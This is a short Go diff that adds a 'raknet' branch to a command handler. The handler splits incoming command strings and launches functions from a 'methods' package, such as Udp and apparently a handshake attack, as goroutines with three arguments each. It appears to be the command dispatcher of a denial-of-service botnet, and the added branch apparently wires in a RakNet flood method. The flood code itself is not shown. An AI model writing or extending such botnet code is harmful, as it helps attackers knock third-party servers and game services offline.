@@ -24,6 +24,12 @@ func CommandHandler(command string) {
 		go methods.Udp(args[1], args[2], args[3])
 	}
 
+	if strings.HasPrefix(commandd, "raknet") {
+		args := strings.Split(commandd, " ")
+
+		go methods.Raknet(args[1], args[2], args[3])
+	}
+
 	if strings.HasPrefix(commandd, "handshake") {
 		args := strings.Split(commandd, " ")
 
